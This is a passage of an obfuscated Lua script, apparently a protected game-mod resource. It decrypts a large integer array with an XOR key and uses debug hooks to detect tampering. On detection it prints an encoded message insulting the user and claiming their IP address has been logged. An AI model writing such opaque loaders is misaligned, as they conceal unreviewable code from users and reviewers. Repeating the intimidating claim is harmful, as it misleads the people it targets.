  2125, 2842, 3020, 1570, 1755, 2247, 2364, 3152, 2228, 1604, 1902, 2456, 1617, 1747, 1967, 2746, 1809, 1690, 2254, 2690,
  1868, 1882, 1968, 2411, 1640, 2787, 1750, 2179, 2336, 2769, 3046, 1860, 3001, 2985, 2279, 2898, 2605, 1702, 1645, 2562,
  2304, 2158, 1714, 1759, 2214, 3070, 1883, 1939, 1571, 2673, 3048, 3108, 2984, 2291, 2035, 2004, 1551, 1741, 1825, 2686,
  2861, 2601, 1826, 2577, 2039, 2600, 2060, 2208, 3035, 1773, 3148, 2755, 1814, 1706, 1933, 2175, 2782, 2665, 2710, 2821,
  2422, 1567, 3169, 1575, 1717, 2575, 2385, 2719, 1960, 2982, 2295, 2972, 1886, 2163, 1722, 2030, 2288, 2711, 1607, 1639,
  2210, 2145, 2730, 2191, 2284, 2366, 2671, 1556, 1958, 3149, 2639, 1838, 2261, 1541, 2855, 2033, 1992, 2483, 2071, 1613,
  2554, 2403, 2224, 2748, 2818, 2297, 2128, 3050, 1547, 2780, 1859, 3140, 1847, 3159, 2625, 2252, 2693, 1552, 1587, 2512,
  2193, 1973, 2555, 3113, 2124, 1682, 1829, 2676, 2806, 2105, 2652, 3134, 2509, 3016, 2143, 2589, 2825, 2721, 2268, 1783,
  2303, 2298, 2801, 2379, 1533, 2559, 2260, 1908, 2315, 1534, 2398, 3029, 2634, 3037, 3162, 2521, 2865, 2235, 1953, 2093,
  2255, 3089, 2425, 1946, 2618, 2023, 2056, 2299, 2884, 2988, 2216, 3127, 2844, 3008, 2720, 2294, 2653, 3017, 3057, 1619,
  3088, 2115, 2845, 3121, 3130, 1959, 2525, 1558, 2942, 2382, 1937, 2849, 1991, 2142, 2891, 1746, 2546, 1758, 1916, 2498,
  3027, 2698, 2357, 2246, 1742, 2790, 1903, 1561, 2770, 2442, 1608, 2642, 2181, 1839, 1924, 1590, 2560, 1923, 1932, 2202,
  2820, 2549, 1819, 2392, 1875, 2756, 2732, 2049, 1869, 2583, 2706, 2834, 2233, 1625, 2761, 1994, 1796, 1978, 1799, 1658,
  2763, 2683, 1749, 3091, 2503, 2557, 2305, 3176, 3011, 2381, 2184, 2967, 2416, 2854, 2258, 2934, 2635, 2463, 1733, 2939,
  1833, 2420, 1907, 1842, 2613, 2227, 2264, 2691, 2008, 1536, 2353, 1890, 1751, 2766, 2810, 1861, 2320, 3175, 2878, 2848,
  1844, 2048, 2292, 1716, 2930, 1709, 1675, 2648, 1635, 2773, 3086, 2580, 3064, 1936, 2833, 2754, 1778, 2344, 2226, 1906,
  1941, 2682, 1620, 2869, 3007, 1840, 1707, 3161, 3092, 1744, 2850, 2989, 1852, 2584, 2593, 2664, 2909, 2905, 2038, 2741,
  1703, 1963, 2393, 2180, 3188, 2753, 2421, 2324, 1787, 2012, 1535, 2649, 2822, 1822, 2177, 2545, 2749, 2487, 3082, 1653,
  2945, 3139, 1657, 2005, 2899, 2091, 2800, 2783, 2053, 1948, 2371, 1596, 3087, 2396, 1770, 1820, 2465, 2101, 2689, 2987,
  2708, 2912, 2378, 2794, 2936, 2674, 1668, 2351, 2547, 1888, 2339, 1925, 1720, 1802, 2231, 2485, 1656, 2429, 2747, 3076,
  2306, 2863, 2774, 2852, 2530, 3094, 1584, 3178, 2041, 2077, 2890, 1998, 1928, 3031, 3072, 1863, 3119, 2886, 2490, 1532,
  1934, 2114, 2661, 2650, 2058, 2156, 2161, 3068, 2454, 2281, 2538, 2492, 3038, 1835, 3006, 2636, 2104, 1774, 2088, 2122,
  3105, 1630, 1804, 2307, 2745, 1995, 2637, 1985, 3030, 2333, 1821, 1910, 1680, 3059, 2007, 2018, 2499, 2760, 1734, 1911,
  1904, 2419, 2345, 2397, 2151, 2437, 3187, 2083, 2696, 1705, 1929, 2928, 1546, 2655, 3025, 2896, 1577, 3150, 1768, 2904,
  1710, 1922, 2809, 2893, 2835, 2713, 2367, 2965, 2432, 1686, 2961, 2631, 2599, 2569, 2725, 2136, 1892, 3182, 2996, 2792,
  2089, 2120, 2811, 2447, 2565, 1775, 2602, 1601, 2278, 2391, 1850, 2267, 3042, 2219, 1698, 2670, 2050, 3180, 1912, 3049,
  2830, 2230, 3116, 2640, 2895, 2275, 1641, 1724, 2614, 2022, 1873, 1600, 1582, 2590, 2931, 2259, 1858, 2203, 1969, 3015,
  2123, 2493, 2205, 2752, 2138, 1740, 3096, 3028, 2135, 2929, 1650, 2325, 1660, 2265, 1855, 1745, 2481, 2365, 1678, 2535,
  2680, 1894, 1631, 2431, 3145, 2907, 2218, 2134, 2954, 2413, 2070, 1935, 3047, 2608, 2692, 2772, 1872, 1664, 2517, 2173,
  1667, 1729, 2436, 2527, 1637, 1676, 2874, 2983, 2622, 1548, 2511, 3171, 1598, 1592, 3023, 2858, 2980, 1853, 2974, 2932,
  2940, 3084, 2510, 2805, 1790, 2615, 2415, 2342, 2274, 2722, 3004, 2829, 2329, 1542, 2139, 3021, 3102, 1955, 2645, 2803,
  2626, 1760, 2277, 2237, 2925, 2052, 2887, 3107, 2192, 2106, 2840, 1756, 2361, 2781, 2302, 1695, 1704, 2289, 1737, 3060,
  2249, 3106, 1797, 2451, 3083, 2473, 1565, 2596, 1655, 2505, 3055, 3183, 2482, 2363, 3052, 2355, 2311, 2775, 2500, 2079,
  3062, 2141, 1550, 2084, 2172, 2283, 2868, 2948, 1981, 2992, 2405, 3133, 3115, 2548, 2199, 2917, 2478, 2817, 1815, 2624,
  2867, 2857, 2270, 1674, 2823, 2514, 2332, 1900, 2502, 2354, 3156, 2836, 2999, 1666, 2951, 2958, 2343, 1711, 2358, 1827,
  2234, 2238, 1621, 2678, 2839, 1688, 1957, 2872, 1897, 2975, 1752, 2526, 2717, 3063, 2064, 2729, 1898, 2112, 2107, 2476,
  2765, 1605, 3054, 2026, 2028, 2735, 2960, 1966, 2666, 2616, 2531, 2296, 2424, 2515, 2662, 2119, 1723, 2076, 2540, 2209,
  2873, 2477, 2633, 2348, 1856, 2864, 1836, 2675, 2085, 2169, 2771, 1603, 2603, 1962, 3109, 2744, 2334, 2881, 2955, 2160,
  2921, 2576, 1665, 2877, 2949, 2474, 1899, 1627, 1798, 2147, 3168, 3014, 2913, 1927, 2695, 2159, 2206, 2178, 1866, 1919,
  2641, 2066, 2346, 1638, 2326, 2728, 2656, 2495, 2441, 2846, 1632, 2623, 1909, 2150, 1564, 3073, 2617, 2702, 2207, 2197,
  1629, 2059, 1626, 2644, 2684, 2496, 2789, 2862, 2360, 1623, 3067, 3024, 2571, 2723, 2534, 2176, 1661, 1971, 2712, 2308,
  2464, 2317, 1654, 2015, 3129, 3040, 2162, 2286, 2152, 1721, 2902, 1562, 2516, 2764, 2621, 2688, 2791, 2537, 1728, 2002,
  2993, 1818, 2953, 2742, 2513, 2327, 2828, 3177, 2335, 2529, 1730, 3019, 2377, 2109, 3078, 2767, 2157, 2977, 2188, 2455,
  2433, 2020, 2034, 2444, 1874, 1813, 2627, 2220, 2906, 2933, 2312, 2006, 3033, 1757, 2986, 1800, 1669, 2959, 2843, 2140,
  2449, 2598, 1761, 2488, 2133, 2337, 1599, 2414, 2585, 2263, 2428, 2113, 1830, 2095, 2687, 1696, 1545, 2021, 2591, 2946,
  1843, 2926, 2892, 2103, 3085, 2153, 2797, 2807, 2200, 2055, 1808, 1845, 2628, 2551, 3009, 2266, 1881, 2607, 1972, 2715,
  2019, 1792, 2387, 2871, 2198, 2950, 2072, 3154, 2242, 2524, 2709, 2470, 2567, 1560, 2533, 2816, 2610, 2507, 2705, 1531,
  2011, 1543, 2434, 1964, 2051, 2859, 2947, 2130, 2440, 3075, 1776, 1867, 1806, 1857, 1877, 2186, 2795, 2024, 2099, 1725,
  2504, 2903, 2389, 2222, 1633, 2250, 1553, 3103, 2068, 1681, 2480, 2462, 3138, 2280, 1865, 3044, 2127, 2262, 2132, 1563,
  2882, 2319, 2314, 2204, 2310, 1589, 2574, 2410, 3186, 3012, 1651, 2243, 2009, 2467, 1683, 2370, 2568, 2740, 1887, 1769,
  2519, 2738, 2244, 2418, 2786, 2964, 2450, 2121, 1648, 1644, 2213, 2685, 2065, 2658, 2669, 1554, 2541, 2313, 2522, 2031,
  2853, 2061, 2943, 2734, 2318, 1647, 2309, 1837, 1684, 2714, 2922, 3039, 1538, 2236, 1718, 2225, 1795, 2201, 2096, 2229,
  3077, 2966, 2570, 2563, 1662, 2272, 2976, 2561, 2401, 2400, 1983, 1767, 2013, 2098, 2654, 1831, 1942, 3147, 3071, 2508,
  2062, 2812, 3167, 2217, 3166, 2916, 3041, 3026, 2069, 2211, 1764, 1642, 2461, 3111, 2171, 2910, 2914, 1615, 2826, 3013,
  1864, 1672, 2592, 2981, 2663, 2915, 3061, 1634, 1920, 2168, 2086, 2558, 1931, 1794, 3095, 2564, 3081, 2240, 1735, 1997,
  2597, 3053, 2827, 1624, 3002, 3110, 1943, 1913, 2466, 2380, 2301, 2536, 2630, 2758, 1891, 1956, 1988, 1677, 2924, 2619,
  2501, 3079, 2446, 3018, 2920, 2750, 1636, 2394, 2587, 2212, 1791, 2856, 2073, 2116, 2918, 1699, 3128, 3120, 1817, 2328,
  1786, 2412, 1950, 2287, 1713, 3160, 2352, 1679, 2962, 2409, 1993, 3056, 1748, 2679, 2518, 1569, 2248, 1811, 2718, 3099,
  1986, 2880, 1685, 1732, 3114, 2814, 2875, 2092, 2221, 1609, -1, 124, 43, 112, 89, 40, 111, 22, 26, 25, 33, 78, 63, 114,
  87, 122, 71, 22, 32, 39, 40, 21, 19, 76, 119, 89, 111, 88, 17, 10, 17, 98, 7, 6, 43, 15, 103, 111, 60, 39, 16, 11, 30,
  89, 47, 100, 44, 112, 161, 74, 10, 36, 55, 19, 85, 89, 127, 36, 58, 17, 52, 7, 99, 51, 10, 128, 86, 48, 105, 103, 63,
  13, 255, 19, 66, 108, 219, 67, 25, 24, 50, 118, 137, 56, 73, 109, 37, 122, 47, 109, 71, 25, 22, 35, 109, 45, 5, 24,
  124, 14, 17, 77, 73, 103, 99, 103, 63, 40, 59, 39, 78, 5, 100, 7, 99, 122, 126, 40, 67, 96, 29, 0, 29, 107, 2, 1, 95,
  90, 60, 245, 122, 82, 62, 8, 43, 112, 116, 120, 74, 22, 34, 50, 49, 5, 57, 7, 28, 59, 51, 38, 71, 2, 34, 20, 48, 121,
  109, 36, 103, 13, 118, 85, 26, 38, 6, 109, 109, 32, 67, 36, 100, 68, 71, 47, 122, 122, 99, 54, 68, 108, 40, 45, 68, 6,
  20, 17, 102, 51, 13, 63, 35, 6, 24, 49, 19, 17, 53, 59, 48, 11, 71, 3, 101, 83, 89, 95, 14, 55, 63, 127, 22, 57, 86,
  72, 56, 30, 86, 89, 63, 103, 16, 39, 112, 30, 70, 31, 123, 41, 78, 116, 17, 8, 58, 210, 78, 178, 85, 99, 15, 97, 71,
  23, 49, 59, 73, 62, 98, 95, 78, 124, 2, 3, 156, 111, 50, 54, 87, 20, 33, 60, 29, 52, 109, 89, 119, 55, 9, 26, 52, 90,
  54, 32, 66, 63, 86, 108, 20, 123, 86, 111, 81, 22, 23, 86, 67, 103, 89, 62, 93, 124, 109, 34, 43, 117, 25, 88, 71, 84,
  77, 83, 112, 57, 42, 67, 41, 116, 56, 26, 86, 69, 89, 69, 17, 20, 110, 119, 3, 36, 33, 7, 57, 57, 10, 97, 63, 49, 117,
  116, 68, 2, 45, 78, 30, 92, 98, 122, 78, 108, 48, 44, 70, 0, 7, 8, 117, 20, 103, 83, 58, 99, 26, 117, 97, 0, 0, 1, 118,
  69, 17, 178, 43, 67, 111, 28, 42, 26, 22, 117, 57, 122, 97, 100, 106, 22, 7, 99, 86, 74, 109, 51, 0, 7, 23, 49, 4, 1,
  71, 0, 82, 17, 74, 203, 10, 46, 94, 57, 57, 19, 4, 103, 7, 86, 28, 74, 70, 87, 119, 103, 117, 43, 90, 112, 88, 98, 161,
  68, 119, 116, 100, 20, 81, 47, 0, 74, 22, 70, 29, 99, 78, 59, 4, 63, 60, 46, 123, 7, 17, 98, 55, 22, 48, 98, 112, 62,
  29, 111, 83, 36, 24, 83, 18, 83, 92, 73, 23, 33, 73, 21, 126, 84, 45, 78, 122, 33, 107, 111, 16, 86, 34, 3, 55, 22, 65,
  109, 111, 60, 89, 59, 103, 34, 9, 43, 57, 40, 42, 102, 230, 36, 23, 71, 111, 89, 8, 111, 99, 66, 99, 96, 74, 110, 116,
  100, 67, 109, 78, 122, 17, 48, 94, 122, 182, 27, 108, 135, 14, 108, 23, 52, 108, 16, 15, 90, 0, 78, 121, 17, 78, 55,
  51, 108, 98, 86, 65, 40, 122, 83, 63, 1, 60, 103, 83, 98, 87, 111, 244, 119, 3, 98, 165, 15, 214, 42, 100, 4, 10, 44,
  83, 249, 74, 118, 27, 119, 95, 17, 95, 78, 78, 39, 28, 74, 43, 28, 122, 70, 110, 36, 25, 62, 94, 109, 38, 229, 65, 86,
  43, 108, 24, 110, 72, 24, 21, 108, 17, 22, 43, 37, 24, 98, 4, 44, 109, 77, 30, 124, 108, 51, 58, 122, 91, 64, 99, 40,
  100, 90, 45, 60, 124, 45, 92, 87, 23, 13, 91, 99, 45, 123, 2, 20, 108, 49, 100, 8, 83, 116, 16, 23, 217, 115, 17, 12,
  59, 112, 107, 86, 218, 17, 92, 26, 17, 34, 55, 1, 73, 27, 71, 190, 108, 50, 90, 8, 111, 17, 76, 71, 72, 33, 83, 35, 25,
  95, 83, 17, 55, 6, 17, 25, 6, 16, 108, 109, 5, 111, 40, 74, 83, 29, 112, 60, 4, 108, 78, 23, 119, 62, 31, 97, 117, 17,
  114, 17, 42, 100, 32, 27, 29, 99, 35, 106, 82, 50, 73, 116, 31, 111, 98, 43, 45, 60, 41, 87, 20, 26, 54, 26, 33, 83, 1,
  107, 44, 56, 71, 112, 110, 100, 86, 89, 100, 94, 103, 194, 5, 147, 110, 124, 53, 78, 80, 54, 107, 120, 16, 81, 226, 65,
  86, 27, 32, 80, 70, 31, 109, 119, 5, 15, 79, 103, 58, 42, 100, 34, 105, 83, 71, 78, 98, 117, 71, 119, 73, 41, 46, 117,
  122, 111, 34, 122, 10, 47, 3, 24, 90, 9, 206, 115, 78, 126, 30, 72, 99, 39, 117, 202, 69, 3, 103, 3, 41, 119, 50, 19,
  112, 104, 30, 12, 100, 10, 51, 20, 14, 36, 35, 17, 43, 8, 115, 104, 16, 54, 68, 86, 38, 90, 68, 55, 37, 99, 119, 18,
  14, 141, 61, 117, 108, 116, 68, 40, 3, 86, 83, 86, 94, 78, 119, 115, 0, 34, 65, 122, 71, 86, 90, 17, 78, 28, 0, 12, 78,
  45, 39, 92, 76, 112, 56, 54, 113, 67, 161, 61, 240, 37, 98, 17, 17, 29, 111, 36, 122, 47, 108, 62, 99, 124, 103, 180,
  29, 86, 47, 233, 117, 86, 32, 122, 11, 77, 121, 33, 75, 25, 34, 123, 122, 127, 45, 44, 100, 89, 21, 15, 244, 87, 83,
  35, 118, 2, 49, 90, 71, 112, 184, 84, 170, 117, 11, 94, 109, 122, 57, 1, 7, 100, 97, 182, 102, 107, 109, 10, 116, 89,
  124, 214, 60, 14, 34, 89, 14, 73, 28, 45, 60, 15, 34, 118, 108, 38, 249, 89, 86, 8, 109, 38, 53, 103, 87, 78, 83, 29,
  56, 20, 98, 66, 28, 90, 66, 107, 58, 33, 64, 59, 72, 87, 117, 108, 78, 55, 35, 83, 78, 109, 127, 100, 98, 103, 67, 78,
  127, 9, 108, 116, 107, 93, 2, 103, 40, 5, 23, 55, 112, 83, 85, 2, 64, 111, 63, 28, 85, 46, 16, 100, 17, 78, 47, 76, 89,
  6, 111, 21, 95, 55, 3, 85, 109, 54, 22, 123, 38, 25, 86, 109, 86, 236, 17, 10, 60, 43, 45, 78, 22, 19, 28, 24, 49, 98,
  57, 25, 36, 100, 67, 112, 17, 29, 89, 78, 63, 95, 217, 106, 159, 86, 57, 1, 52, 203, 109, 83, 34, 2, 119, 83, 103, 119,
  250, 119, 88, 61, 111, 15, 74, 112, 103, 88, 67, 80, 59, 96, 80, 57, 101, 28, 57, 117, 69, 84, 84, 123, 67, 67, 111,
  54, 44, 16, 88, 116, 2, 119, 49, 100, 111, 8, 17, 28, 103, 38, 39, 83, 84, 17, 86, 29, 67, 86, 99, 103, 117, 67, 99, 8,
  122, 175, 51, 0, 43, 39, 78, 119, 26, 17, 124, 71, 127, 44, 19, 119, 36, 38, 255, 22, 86, 103, 89, 166, 108, 127, 122,
  175, 77, 116, 26, 129, 57, 17, 86, 123, 99, 57, 37, 78, 40, 71, 44, 78, 122, 93, 40, 64, 28, 25, 52, 62, 55, 89, 121,
  81, 40, 60, 76, 17, 44, 85, 115, 28, 68, 52, 125, 100, 119, 103, 108, 112, 41, 27, 53, 51, 69, 2, 111, 70, 57, 37, 99,
  58, 35, 17, 36, 124, 111, 83, 86, 65, 38, 44, 10, 56, 59, 59, 122, 30, 78, 65, 158, 100, 67, 78, 83, 111, 157, 38, 20,
  17, 18, 31, 56, 88, 100, 94, 108, 67, 82, 74, 31, 1, 103, 117, 15, 99, 58, 41, 16, 17, 65, 39, 51, 56, 97, 35, 73, 103,
  17, 119, 77, 191, 48, 119, 44, 3, 127, 123, 122, 71, 33, 12, 124, 5, 78, 103, 55, 111, 108, 49, 32, 34, 121, 123, 99,
  16, 71, 7, 7, 87, 78, 111, 22, 98, 89, 117, 28, 71, 13, 102, 17, 78, 95, 112, 57, 109, 23, 67, 139, 78, 62, 109, 93,
  89, 78, 103, 49, 15, 25, 78, 99, 44, 89, 111, 54, 116, 58, 56, 50, 24, 89, 100, 17, 117, 126, 56, 114, 99, 88, 85, 71,
  124, 13, 124, 70, 17, 44, 69, 71, 62, 111, 1, 78, 79, 94, 1, 71, 108, 17, 60, 77, 98, 119, 117, 68, 98, 86, 84, 47, 41,
  126, 63, 65, 54, 37, 109, 40, 45, 67, 19, 62, 108, 33, 54, 86, 11, 32, 9, 108, 71, 116, 71, 110, 25, 249, 95, 77, 78,
  45, 35, 63, 40, 83, 24, 13, 17, 116, 56, 125, 109, 73, 100, 89, 25, 89, 119, 19, 86, 127, 19, 7, 62, 83, 94, 109, 57,
  2, 24, 89, 40, 4, 98, 91, 56, 108, 51, 6, 17, 66, 62, 179, 20, 103, 58, 122, 36, 43, 3, 70, 122, 112, 78, 19, 112, 25,
  89, 53, 61, 82, 96, 31, 46, 8, 124, 32, 74, 107, 123, 119, 122, 35, 34, 33, 85, 92, 98, 59, 80, 117, 89, 106, 32, 117,
  86, 83, 164, 68, 48, 26, 3, 0, 60, 66, 19, 26, 78, 67, 86, 31, 20, 97, 63, 34, 67, 3, 109, 86, 37, 29, 29, 46, 84, 108,
  93, 28, 33, 65, 89, 78, 84, 0, 111, 100, 19, 17, 13, 32, 67, 83, 112, 67, 17, 108, 111, 86, 100, 33, 103, 30, 3, 233,
  110, 109, 2, 126, 48, 63, 83, 32, 29, 84, 124, 89, 86, 50, 11, 110, 4, 74, 66, 94, 5, 110, 44, 35, 117, 26, 91, 115,
  13, 22, 70, 103, 88, 31, 38, 49, 48, 38, 101, 69, 24, 127, 99, 35, 49, 58, 28, 234, 32, 126, 100, 13, 44, 15, 92, 59,
  229, 98, 24, 253, 39, 39, 45, 121, 71, 19, 70, 121, 70, 64, 78, 0, 65, 82, 3, 63, 109, 86, 40, 32, 40, 95, 31, 126, 35,
  39, 39, 63, 65, 48 }, "nDUvPngMZyBL4TsLcCj1s1vWGO"); mENV8alidW2hSaCV37Grs3boO2dDa6wZsskR5MSmSacX3tWrneloeyib =
yVyhm3vb6ruIxT9vQryPZvvmyODhgsFbiAXqVAvE4m1wyBbS9rvmsb4ulBZ17ZsSmc; mhRZKE0Fm3ekYzB8pn8KkDmgx2mvrw3xVrtqLorl3rb3QhdBLG6 =
yVyhm3vb6ruIxT9vQryPZvvmyODhgsFbiAXqVAvE4m1wyBbS9rvmsb4ulBZ17ZsSmc; o1LUcBShDKMmErEiMU4pAgXK2eKx5RhZ6qPYRa9BzO90LF6asVoJ16U =
mhRZKE0Fm3ekYzB8pn8KkDmgx2mvrw3xVrtqLorl3rb3QhdBLG6; aXiXLugTbDaNFQ9JZZwZWSNg42PKTWBvdYmWrHNE3uWm0PJG6x8bQRT =
o1LUcBShDKMmErEiMU4pAgXK2eKx5RhZ6qPYRa9BzO90LF6asVoJ16U; uTZlJAPKo93RViqPn9du7316dqHsUokbeKgYo7gN5ALGtNrRKqQxOCIWh7Dq7a1Se2PZNwEgAxc =
aXiXLugTbDaNFQ9JZZwZWSNg42PKTWBvdYmWrHNE3uWm0PJG6x8bQRT; h0dwzM24BSSkIcZyEtZEUFJlRsV2NY5Ba5PpHZrf7t15IOg4nvSBJL4FlJ =
uTZlJAPKo93RViqPn9du7316dqHsUokbeKgYo7gN5ALGtNrRKqQxOCIWh7Dq7a1Se2PZNwEgAxc; tP6E8jN6S78Y22eEDsYruQmI4vm3TD1tt8oOJtQ0cOI9d9U7q6O6qDmha3Mjy8XkMpm9hP =
h0dwzM24BSSkIcZyEtZEUFJlRsV2NY5Ba5PpHZrf7t15IOg4nvSBJL4FlJ; j8VmbYUcs5oZvtOoNXhl1nUhOg7hfhEJ7gVZYIcRdrc5o0jxA5I8TRW79Awf0w4AJE7q2 =
tP6E8jN6S78Y22eEDsYruQmI4vm3TD1tt8oOJtQ0cOI9d9U7q6O6qDmha3Mjy8XkMpm9hP; fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS = function(
  a)
  K, F = 1777546258976405, 16384 + 6669; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; gtzHLVKCwbA6Oco9I0DGp3nCyB7EQdL5KMiWl7RGw6QeY1KgxzAyp25EPGftTRvN = function(b)
  co = coroutine.create(b)
  bSIQfzfV2NifXSnIyx8j0jgPGJsYY8cdVZSuuWerYooqS3LQrYtGR = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(bSIQfzfV2NifXSnIyx8j0jgPGJsYY8cdVZSuuWerYooqS3LQrYtGR, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return bSIQfzfV2NifXSnIyx8j0jgPGJsYY8cdVZSuuWerYooqS3LQrYtGR
end; todCIW3ZWWIrZ88JA4BRB1ci62M6hgWHv4BaQvobFjYW6e6nfhTVgNBqfUQsxsEXt = function(f, g)
  pZ8Rtid2CcFbHLphwrRRUm18mw557dzJharO4X6z3fpYOLWX6Qd0HP4odAb06PVojacZR27p = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; foch9qiP3z5UbF4cHE6lY15dkAn4M90j1Q5OP1T0NBGdavQbTXQ3FAH1Ag31XHI7Zvrzegq = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; uIVsKZjYW1Su8dWz4WtxsA0IyNLEht7IeYqS5Osn9elOAdPnxt9iTKGbN9CRGPThf = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      pZ8Rtid2CcFbHLphwrRRUm18mw557dzJharO4X6z3fpYOLWX6Qd0HP4odAb06PVojacZR27p(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; kH1oxpBnifNbBqLroninRAt2FJT8hLHNjeH3gCVxUpe7hCp25U1R8FuG1EYfhKTD0vVTaQ0bi = function(p, n)
    rF10jxib6npcufrEiPJntaHQQG1t9M5HjNcHVVFKy5Jhhb0C3MIJP3 = ""
    for k, q in pairs(p) do rF10jxib6npcufrEiPJntaHQQG1t9M5HjNcHVVFKy5Jhhb0C3MIJP3 =
      rF10jxib6npcufrEiPJntaHQQG1t9M5HjNcHVVFKy5Jhhb0C3MIJP3 ..
      j8VmbYUcs5oZvtOoNXhl1nUhOg7hfhEJ7gVZYIcRdrc5o0jxA5I8TRW79Awf0w4AJE7q2
      [fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('65') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('B2') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('18') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('63') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('E4') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('C9')]
      [fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('95') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('16') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('FB') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('18')](
      q) end
    ; n(rF10jxib6npcufrEiPJntaHQQG1t9M5HjNcHVVFKy5Jhhb0C3MIJP3)
  end; foch9qiP3z5UbF4cHE6lY15dkAn4M90j1Q5OP1T0NBGdavQbTXQ3FAH1Ag31XHI7Zvrzegq(f,
    function(r) uIVsKZjYW1Su8dWz4WtxsA0IyNLEht7IeYqS5Osn9elOAdPnxt9iTKGbN9CRGPThf(r, g,
        function(s) kH1oxpBnifNbBqLroninRAt2FJT8hLHNjeH3gCVxUpe7hCp25U1R8FuG1EYfhKTD0vVTaQ0bi(s,
            function(t) if #gtzHLVKCwbA6Oco9I0DGp3nCyB7EQdL5KMiWl7RGw6QeY1KgxzAyp25EPGftTRvN(j8VmbYUcs5oZvtOoNXhl1nUhOg7hfhEJ7gVZYIcRdrc5o0jxA5I8TRW79Awf0w4AJE7q2[fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('4A') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('31') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('FB') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('E2')]) == 1 then if j8VmbYUcs5oZvtOoNXhl1nUhOg7hfhEJ7gVZYIcRdrc5o0jxA5I8TRW79Awf0w4AJE7q2[fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('4A') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('31') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('FB') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('E2')] == j8VmbYUcs5oZvtOoNXhl1nUhOg7hfhEJ7gVZYIcRdrc5o0jxA5I8TRW79Awf0w4AJE7q2[fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('7E') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('18') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('63') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('E4') .. fYUds3m3zrtTg7Bkw9RMMpVwBVPUYNsjbzBinrIPpsXx922GGzkRcrgolMmhMKQS('B2')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\